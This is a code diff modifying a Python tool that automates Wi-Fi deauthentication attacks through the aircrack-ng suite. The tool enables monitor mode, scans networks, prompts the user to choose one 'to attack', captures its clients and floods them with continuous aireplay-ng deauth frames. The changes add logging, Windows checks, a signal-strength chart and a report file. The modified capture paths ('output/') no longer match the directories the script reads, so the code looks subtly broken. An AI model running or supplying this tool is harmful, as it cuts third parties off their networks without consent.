@@ -12,6 +12,9 @@ import shutil
 import subprocess
 import threading
 import time
+import logging
+import platform
+import matplotlib.pyplot as plt
 
 # Constants
 BAND_OPTIONS = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Will be slower)"]
@@ -20,35 +23,49 @@ CLIENT_CSV_FIELDNAMES = ["Station MAC", "First time seen", "Last time seen", "Po
 
 # Regular Expressions
 MAC_ADDRESS_REGEX = re.compile(r'(?:[0-9a-fA-F]:?){12}')
-WLAN_CODE = re.compile("Interface (wlan[0-9]+)")
+WLAN_CODE = re.compile(r"Interface (\S+)", re.MULTILINE)
+
+logging.basicConfig(filename='network_attack.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Helper functions
 def check_sudo():
-    """Check if the script is running with sudo privileges."""
-    if 'SUDO_UID' not in os.environ:
+    """Check if the script is running with sudo privileges (Unix-like systems only)."""
+    if platform.system() != 'Windows' and 'SUDO_UID' not in os.environ:
+        logging.error("Script not run with sudo privileges.")
         print("Please run this program with sudo.")
         exit()
 
 def find_network_interfaces():
     """Find and return network interface controllers on the computer."""
-    result = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
+    if platform.system() == 'Windows':
+        result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True).stdout
+    else:
+        result = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
     return WLAN_CODE.findall(result)
 
 def set_monitor_mode(interface):
-    """Set the specified network interface controller to monitor mode."""
-    subprocess.run(["ip", "link", "set", interface, "down"])
-    subprocess.run(["airmon-ng", "check", "kill"])
-    subprocess.run(["iw", interface, "set", "monitor", "none"])
-    subprocess.run(["ip", "link", "set", interface, "up"])
+    """Set the specified network interface controller to monitor mode (Unix-like systems only)."""
+    if platform.system() == 'Windows':
+        logging.info("Monitor mode setting is not supported on Windows.")
+    else:
+        subprocess.run(["ip", "link", "set", interface, "down"])
+        subprocess.run(["airmon-ng", "check", "kill"])
+        subprocess.run(["iw", interface, "set", "monitor", "none"])
+        subprocess.run(["ip", "link", "set", interface, "up"])
+        logging.info(f"Set {interface} to monitor mode.")
 
 def set_band_to_monitor(interface, choice):
     """Start airodump-ng with the specified band to monitor."""
     bands = ["bg", "a", "abg"]
     band = bands[choice] if choice in [0, 1, 2] else "abg"
-    subprocess.Popen(
-        ["airodump-ng", "--band", band, "-w", "file", "--write-interval", "1", "--output-format", "csv", interface],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    )
+    if platform.system() == 'Windows':
+        logging.info("Airodump-ng is not supported on Windows.")
+    else:
+        subprocess.Popen(
+            ["airodump-ng", "--band", band, "-w", "output/file", "--write-interval", "1", "--output-format", "csv", interface],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        logging.info(f"Started monitoring on {interface} with band {band}.")
 
 def backup_csv_files():
     """Move all .csv files in the current directory to a backup folder."""
@@ -60,17 +77,30 @@ def backup_csv_files():
             os.makedirs(backup_dir, exist_ok=True)
             timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
             shutil.move(file_name, os.path.join(backup_dir, f"{timestamp}-{file_name}"))
+            logging.info(f"Moved {file_name} to backup folder.")
 
 def check_for_essid(essid, networks):
     """Check if the ESSID is already in the list of networks."""
     return not any(network["ESSID"] == essid for network in networks)
+
+def visualize_networks(networks):
+    """Visualize the detected Wi-Fi networks."""
+    essids = [network["ESSID"] for network in networks]
+    powers = [int(network["Power"]) for network in networks]
+
+    plt.figure(figsize=(10, 5))
+    plt.barh(essids, powers, color='blue')
+    plt.xlabel('Signal Strength (dBm)')
+    plt.ylabel('ESSID')
+    plt.title('Detected Wi-Fi Networks')
+    plt.show()
 
 def display_wifi_networks():
     """Display the Wi-Fi networks and allow the user to select one."""
     networks = []
     try:
         while True:
-            subprocess.call("clear", shell=True)
+            subprocess.call("cls" if platform.system() == "Windows" else "clear", shell=True)
             for file_name in os.listdir():
                 if file_name.endswith(".csv"):
                     with open(file_name) as csv_file:
@@ -90,6 +120,8 @@ def display_wifi_networks():
     except KeyboardInterrupt:
         pass
 
+    visualize_networks(networks)
+
     while True:
         try:
             choice = int(input("Select a network to attack (number): "))
@@ -100,24 +132,49 @@ def display_wifi_networks():
         print("Invalid choice. Please try again.")
 
 def set_managed_mode(interface):
-    """Set the network interface controller back to managed mode and restart network services."""
-    subprocess.run(["ip", "link", "set", interface, "down"])
-    subprocess.run(["iwconfig", interface, "mode", "managed"])
-    subprocess.run(["ip", "link", "set", interface, "up"])
-    subprocess.run(["service", "NetworkManager", "start"])
+    """Set the network interface controller back to managed mode and restart network services (Unix-like systems only)."""
+    if platform.system() == 'Windows':
+        logging.info("Managed mode setting is not supported on Windows.")
+    else:
+        subprocess.run(["ip", "link", "set", interface, "down"])
+        subprocess.run(["iwconfig", interface, "mode", "managed"])
+        subprocess.run(["ip", "link", "set", interface, "up"])
+        subprocess.run(["service", "NetworkManager", "start"])
+        logging.info(f"Set {interface} back to managed mode.")
 
 def capture_clients(bssid, channel, interface):
     """Capture client devices connected to the selected network."""
-    subprocess.Popen(
-        ["airodump-ng", "--bssid", bssid, "--channel", channel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", interface],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    )
+    if platform.system() == 'Windows':
+        logging.info("Capturing clients is not supported on Windows.")
+    else:
+        subprocess.Popen(
+            ["airodump-ng", "--bssid", bssid, "--channel", channel, "-w", "output/clients", "--write-interval", "1", "--output-format", "csv", interface],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        logging.info(f"Started capturing clients on {bssid} channel {channel} with interface {interface}.")
 
 def perform_deauth_attack(target_bssid, client_mac, interface):
     """Perform a deauthentication attack on the specified client."""
-    subprocess.Popen(
-        ["aireplay-ng", "--deauth", "0", "-a", target_bssid, "-c", client_mac, interface]
-    )
+    if platform.system() == 'Windows':
+        logging.info("Deauthentication attack is not supported on Windows.")
+    else:
+        subprocess.Popen(
+            ["aireplay-ng", "--deauth", "0", "-a", target_bssid, "-c", client_mac, interface]
+        )
+        logging.info(f"Started deauth attack on {client_mac} on {target_bssid} using {interface}.")
+
+def generate_report(networks, active_clients):
+    """Generate a report of the networks and clients."""
+    report_file = f"report_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
+    with open(report_file, 'w') as f:
+        f.write("Wi-Fi Networks:\n")
+        for network in networks:
+            f.write(f"ESSID: {network['ESSID']}, BSSID: {network['BSSID']}, Channel: {network['channel']}, Signal: {network['Power']}\n")
+        
+        f.write("\nActive Clients:\n")
+        for client in active_clients:
+            f.write(f"Client MAC: {client}\n")
+    logging.info(f"Report generated: {report_file}")
 
 def main():
     print(r"""
@@ -136,7 +193,8 @@ ______   __ ______    _   _____ _   ___    _   ___
     print("\n****************************************************************")
     print("\n* Copyright of jimididit, 2024                                 *")
     print("\n* https://www.jimididit.com                                    *")
-    print("\n* https://www.youtube.com/@jimididit                            *")
+    print("\n* https://www.youtube.com/@jimididit                           *")
+    print("\n* Modified by Dystortion                                      *")
     print("\n****************************************************************")
 
     check_sudo()
@@ -192,10 +250,12 @@ ______   __ ______    _   _____ _   ___    _   ___
     active_clients = set()
     threads_started = []
 
-    subprocess.run(["airmon-ng", "start", wifi_interface, channel])
+    if platform.system() != 'Windows':
+        subprocess.run(["airmon-ng", "start", wifi_interface, channel])
+
     try:
         while True:
-            subprocess.call("clear", shell=True)
+            subprocess.call("cls" if platform.system() == "Windows" else "clear", shell=True)
             for file_name in os.listdir():
                 if file_name.startswith("clients") and file_name.endswith(".csv"):
                     with open(file_name) as csv_file:
@@ -215,9 +275,10 @@ ______   __ ______    _   _____ _   ___    _   ___
             time.sleep(1)
     except KeyboardInterrupt:
         print("\nStopping deauth attack")
+        logging.info("Deauth attack stopped by user.")
 
     set_managed_mode(wifi_interface)
+    generate_report([selected_network], active_clients)
 
 if __name__ == "__main__":
     main()
-
